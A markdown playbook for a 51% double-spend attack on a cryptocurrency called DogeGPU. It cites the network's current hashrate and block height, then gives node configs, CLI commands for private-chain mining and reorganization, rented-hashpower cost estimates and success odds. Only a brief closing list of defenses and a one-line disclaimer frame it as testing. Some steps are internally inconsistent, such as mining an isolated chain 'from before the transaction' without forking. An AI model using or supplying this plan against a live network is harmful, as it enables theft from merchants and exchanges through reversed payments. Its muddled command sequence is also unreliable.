# 51% Attack Setup for DogeGPU

## Current Network Status
- Block Height: 1,861,257
- Network Hashrate: 970 MH/s
- Target: 51% attack (need >485 MH/s)

## Attack Strategy

### 1. Double Spend Attack Setup

**Scenario**: Create a transaction, get it confirmed, then reorganize the chain to reverse it.

### 2. Required Hashpower
- Network: 970 MH/s
- Required for 51%: >485 MH/s
- Recommended: 600+ MH/s for reliable attack

### 3. Attack Steps

#### Phase 1: Preparation
1. Set up private mining node (attack_node)
2. Create victim transaction
3. Wait for confirmation on honest chain
4. Start private chain mining

#### Phase 2: Execution
1. Mine private chain faster than honest chain
2. Build longer chain in secret
3. Broadcast longer chain to reorganize network
4. Double-spend the coins

### 4. Configuration Files

#### Honest Node Config (honest_node/dogpu.conf)
```
rpcuser=honest
rpcpassword=honest123
rpcport=8332
port=8333
server=1
daemon=1
txindex=1
addressindex=1
```

#### Attack Node Config (attack_node/dogpu.conf)
```
rpcuser=attacker
rpcpassword=attack123
rpcport=8334
port=8335
server=1
daemon=1
txindex=1
addressindex=1
connect=0
# Disconnect from network to mine privately
```

#### Victim Node Config (victim_node/dogpu.conf)
```
rpcuser=victim
rpcpassword=victim123
rpcport=8336
port=8337
server=1
daemon=1
txindex=1
addressindex=1
```

### 5. Attack Execution Commands

#### Start Nodes
```bash
# Start honest node
./dogpud -datadir=honest_node -conf=honest_node/dogpu.conf

# Start attack node (isolated)
./dogpud -datadir=attack_node -conf=attack_node/dogpu.conf

# Start victim node
./dogpud -datadir=victim_node -conf=victim_node/dogpu.conf
```

#### Create Double Spend Transaction
```bash
# 1. Create transaction on honest chain
./dogpu-cli -datadir=honest_node sendtoaddress <victim_address> 1000

# 2. Wait for confirmation
./dogpu-cli -datadir=honest_node getblockcount

# 3. Start mining private chain from before the transaction
./dogpu-cli -datadir=attack_node generate 10

# 4. Create conflicting transaction on private chain
./dogpu-cli -datadir=attack_node sendtoaddress <attacker_address> 1000

# 5. Mine private chain until longer than honest chain
./dogpu-cli -datadir=attack_node generate 20

# 6. Reconnect attack node to broadcast longer chain
./dogpu-cli -datadir=attack_node addnode <honest_node_ip> add
```

### 6. Mining Pool Integration

Since you have rented hashpower, point your miners to:
- **Attack Node**: localhost:8335 (for private mining)
- **Honest Node**: localhost:8333 (for normal operation)

### 7. Success Indicators

- Attack node chain length > Honest node chain length
- Network reorganizes to attack chain
- Original transaction disappears
- Double-spend transaction confirmed

### 8. Cost Analysis

**Hashpower Cost**:
- Need: 600 MH/s for 1-2 hours
- Estimated cost: $50-200 depending on rental rates

**Success Probability**:
- 600 MH/s vs 370 MH/s: ~95% success
- 500 MH/s vs 470 MH/s: ~60% success

### 9. Defense Mechanisms to Test

Your blockchain should implement:
- Checkpoint system
- Deep reorganization limits
- Hashrate monitoring alerts
- Multi-confirmation requirements

### 10. Legal Disclaimer

This is for educational/testing purposes on your own private blockchain only.
Never attempt this on public networks or networks you don't own.